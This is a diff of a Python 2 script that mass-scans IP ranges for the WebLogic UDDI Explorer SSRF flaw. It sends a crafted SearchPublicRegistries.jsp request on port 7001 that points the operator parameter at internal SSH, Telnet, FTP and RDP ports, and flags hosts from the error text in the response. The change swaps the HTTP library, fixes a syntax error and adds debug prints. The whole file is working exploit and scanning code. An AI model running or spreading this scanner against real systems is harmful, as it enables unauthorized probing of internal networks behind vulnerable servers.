@@ -7,7 +7,7 @@ import sys
 import time
 import Queue
 import threading
-import requests
+import httplib
 
 queue = Queue.Queue()
 I = 0
@@ -15,30 +15,37 @@ I = 0
 def scan(ip_str):
     web_ports = ('7001',)
     test_ports = ('22','23','21','3389')
-    ssrf = 0
     for web_port in web_ports:
+        ssrf = 0
         len1 = 0
         len2 = 0
-        print ip_str
         for test_port in test_ports:
-            exp_url = "http://%s:%s/uddiexplorer/SearchPublicRegistries.jsp?" %(ip_str,web_port)+"operator=http://%s:%s" %(ip_str,test_port) \
+            exp_url = "/uddiexplorer/SearchPublicRegistries.jsp?operator=http://%s:%s" %(ip_str,test_port) \
                    + "&rdoSearch=name&txtSearchname=sdf&txtSearchkey=&txtSearchfor=&selfor=Business+location&btnSubmit=Search"
+             
+            httpClient = None
+            resp = ''
             try:
-                response = requests.get(exp_url, timeout=15, verify=False)
-        #SSRF判断
-                re_sult1 = re.findall('weblogic.uddi.client.structures.exception.XML_SoapException',response.content)
-        #丢失连接.端口连接不上
-                re_sult2 = re.findall('but could not connect',response.content)
-                len1 = len(re_sult1)
-                len2 = len(re_sult2
-                pass
-            except Exception,e:
+                httpClient = httplib.HTTPConnection(ip_str, int(web_port), timeout=15)
+                httpClient.request('GET', exp_url)
+                response = httpClient.getresponse()
+                print response.status
+                print response.reason
+                resp = response.read()
+            except Exception, e:
                 print e.message
-                continue
             finally:
-                if (len1 != 0 and len2 == 0):
-                    ssrf = 1
-                    break
+                if httpClient:
+                    httpClient.close()
+            re_sult1 = re.findall('weblogic.uddi.client.structures.exception.XML_SoapException',resp)
+            re_sult2 = re.findall('but could not connect',resp)
+            len1 = len(re_sult1)
+            len2 = len(re_sult2)
+            print str(len1) + '----' + str(len2)
+            if (len1 != 0 and len2 == 0):
+                ssrf = 1
+                break
+        print ip_str + 'rrrrrrrrr\n'
         if ssrf > 0:
             print ip_str + ':' + web_port + ' is Weblogic SSRF'
         else:
@@ -48,6 +55,7 @@ class ThreadNum(threading.Thread):
     def __init__(self,queue):
         threading.Thread.__init__(self)
         self.queue = queue
+
     def run(self):
         while True:
             try:
@@ -60,7 +68,7 @@ class ThreadNum(threading.Thread):
                 scan(task_host)
             except Exception,e:
                 continue
-        
+    
 def t_join(m_count):
     tmp_count = 0
     i = 0
@@ -85,7 +93,7 @@ def get_ip_list(ip_info):
     ip_list = []
     iptonum = lambda x:sum([256**j*int(i) for j,i in enumerate(x.split('.')[::-1])])
     numtoip = lambda x: '.'.join([str(x/(256**i)%256) for i in range(3,-1,-1)])
-    if '-' in ip_info:     # 格式举例   192.168.0.1-192.168.0.128
+    if '-' in ip_info:     # 格式举例   192.168.0.1-192.168.0.
         ip_range = ip_info.split('-')
         ip_start = long(iptonum(ip_range[0]))
         ip_end = long(iptonum(ip_range[1]))
@@ -106,7 +114,7 @@ def get_ip_list(ip_info):
     elif ',' in ip_info:                                   #格式举例  192.168.0.1,192.168.2.2,192.168.5
         ip_info_list = ip_info.split(',')
         for each_ip_info in ip_info_list:
-            ip_list.extend(get_ip_list(each_ip_info))  
+            ip_list.extend(get_ip_list(each_ip_info))
     else:
         ip_split=ip_info.split('.')
         net = len(ip_split)
@@ -124,17 +132,15 @@ def get_ip_list(ip_info):
         else:
             print "-h wrong format"
     return ip_list
-        
+    
 if __name__ == "__main__":
     msg = '''
 Usage: python scan-weblogic-ssrf.py -h IP [-m 10]
-    -h 192.168.0.1 |  -h 192.168.0.1-192.168.0.128 | -h 192.168.0.1,192.168.1.1,192.168.0 |
-    -h  ip_list_file.ini | -h 192.168.0 | -h 192.168.0.
-    '''
+-h 192.168.0.1 |  -h 192.168.0.1-192.168.0.128 | -h 192.168.0.1,192.168.1.1,192.168.0 |
+-h  ip_list_file.ini | -h 192.168.0 | -h 192.168.0.
+'''
     ip_list = []
 
-    
-    
     if len(sys.argv) < 3:
         print msg
         sys.exit(-1)
@@ -149,7 +155,7 @@ Usage: python scan-weblogic-ssrf.py -h IP [-m 10]
                 m_count = int(arg)
         ip_list = get_ip_list(ip_info)
     except Exception,e:
-          print msg
+        print msg
     if len(ip_list) == 0 :
         print msg
         sys.exit(-1)
@@ -161,9 +167,9 @@ Usage: python scan-weblogic-ssrf.py -h IP [-m 10]
         t.start()
     t_join(m_count)
 
-    
-    
-    
-    
-    
-    
+
+
+
+
+
+
